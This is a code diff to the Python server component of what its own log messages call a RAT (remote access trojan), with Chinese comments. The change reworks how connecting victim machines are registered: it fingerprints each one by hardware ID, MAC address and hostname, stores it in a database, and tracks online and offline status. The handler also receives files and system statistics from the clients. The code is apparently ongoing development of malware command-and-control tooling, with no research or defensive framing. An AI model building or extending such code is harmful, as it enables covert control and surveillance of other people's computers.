@@ -8,8 +8,8 @@ import queue
 from datetime import datetime
 from ..extensions import socketio
 from ..services import client_manager
-from ..utils.helpers import human_readable_size
 from ..config import BaseConfig
+from ..utils.helpers import human_readable_size
 
 def reliable_send(sock, data_dict):
     payload = json.dumps(data_dict).encode('utf-8') + b'\n'
@@ -20,24 +20,7 @@ def client_handler(conn, addr, client_id, app):
     print(f"[+] RAT客户端已连接: {addr}, ID: {client_id}")
     socketio.emit('new_client', {'id': client_id, 'addr': str(addr)})
 
-    # 在数据库中创建/更新客户端为在线
-    try:
-        from ..extensions import db
-        from ..models import Client
-        with app.app_context():
-            client = Client.query.filter_by(client_id=client_id).first()
-            ip_str = str(addr[0]) if isinstance(addr, tuple) and len(addr) > 0 else str(addr)
-            if not client:
-                client = Client(client_id=client_id, ip_address=ip_str, status='online', last_seen=datetime.utcnow())
-                db.session.add(client)
-            else:
-                client.ip_address = ip_str
-                client.status = 'online'
-                client.last_seen = datetime.utcnow()
-            db.session.commit()
-    except Exception as e:
-        # 避免数据库问题影响连接主流程
-        print(f"[DB] 更新客户端在线状态失败: {e}")
+    # 注意：不在这里创建数据库记录，等待客户端发送完整信息后再创建
 
     buffer = b''
     try:
@@ -65,25 +48,63 @@ def client_handler(conn, addr, client_id, app):
                     continue
 
                 if data.get('status') == 'connected':
-                    info = client_manager.client_info[client_id]
-                    info['user'] = data.get('user', '未知')
-                    info['initial_cwd'] = data.get('cwd', '未知')
-                    info['os'] = data.get('os', '未知')
-                    socketio.emit('client_updated', {'id': client_id, **info})
-
-                    # 同步系统信息到数据库
+                    # 获取设备指纹信息
+                    device_fingerprint = data.get('device_fingerprint')
+                    hardware_id = data.get('hardware_id')
+                    mac_address = data.get('mac_address')
+                    hostname = data.get('hostname')
+                    
+                    # 统一的客户端记录处理逻辑
                     try:
                         from ..extensions import db
                         from ..models import Client
                         with app.app_context():
-                            client = Client.query.filter_by(client_id=client_id).first()
-                            if client:
-                                client.os_type = data.get('os')
-                                client.status = 'online'
-                                client.last_seen = datetime.utcnow()
-                                db.session.commit()
+                            client = None
+                            created = False
+                            
+                            if device_fingerprint:
+                                # 仅在有设备指纹时才查找或创建客户端记录
+                                client, created = Client.find_or_create_by_fingerprint(
+                                    device_fingerprint=device_fingerprint,
+                                    hardware_id=hardware_id,
+                                    mac_address=mac_address,
+                                    hostname=hostname or data.get('user', '未知'),
+                                    ip_address=str(addr[0]) if isinstance(addr, tuple) and len(addr) > 0 else str(addr),
+                                    os_type=data.get('os'),
+                                    os_version=data.get('os_version') or data.get('os'),
+                                    status='online',
+                                    last_seen=datetime.utcnow()
+                                )
+                                
+                                # 只有成功创建或找到客户端时才进行数据库操作
+                                if client:
+                                    if created:
+                                        db.session.add(client)
+                                    db.session.commit()
+                                    print(f"[+] 客户端记录已{'创建' if created else '更新'}: {client.client_id}")
+                                    
+                                    # 更新client_manager中的映射关系，将临时ID映射到数据库记录ID
+                                    if client_id in client_manager.client_info:
+                                        client_manager.client_info[client_id]['db_client_id'] = client.id
+                                else:
+                                    # 此处不应发生，因为 find_or_create_by_fingerprint 在有指纹时总会返回一个客户端
+                                    print(f"[!] 无法创建或查找客户端记录，即使有设备指纹。")
+                            else:
+                                # 没有设备指纹时，不执行任何数据库操作，仅记录日志
+                                print(f"[!] 客户端连接，但未提供设备指纹。临时ID: {client_id}。不创建数据库记录。")
+
                     except Exception as e:
-                        print(f"[DB] 同步客户端信息失败: {e}")
+                        print(f"[!] 处理客户端记录时出错: {e}")
+                        import traceback
+                        traceback.print_exc()
+                    
+                    # 更新内存中的客户端信息
+                    info = client_manager.client_info[client_id]
+                    info['user'] = data.get('user', '未知')
+                    info['initial_cwd'] = data.get('cwd', '未知')
+                    info['os'] = data.get('os', '未知')
+                    info['hostname'] = hostname or data.get('user', '未知')
+                    socketio.emit('client_updated', {'id': client_id, **info})
                     continue
 
                 if "file" in data and "data" in data:
@@ -133,6 +154,13 @@ def client_handler(conn, addr, client_id, app):
                         'mem_percent': data.get('mem_percent')
                     })
     finally:
+        # 先尝试读取映射到的数据库客户端ID
+        db_client_id = None
+        try:
+            db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
+        except Exception:
+            pass
+
         client_manager.remove_client(client_id)
         conn.close()
         socketio.emit('client_disconnected', {'id': client_id})
@@ -142,7 +170,12 @@ def client_handler(conn, addr, client_id, app):
             from ..extensions import db
             from ..models import Client
             with app.app_context():
-                client = Client.query.filter_by(client_id=client_id).first()
+                client = None
+                if db_client_id:
+                    client = Client.query.get(db_client_id)
+                if client is None:
+                    # 回退方案：尽量避免使用临时连接ID，但作为兜底
+                    client = Client.query.filter_by(client_id=client_id).first()
                 if client:
                     client.status = 'offline'
                     client.last_seen = datetime.utcnow()
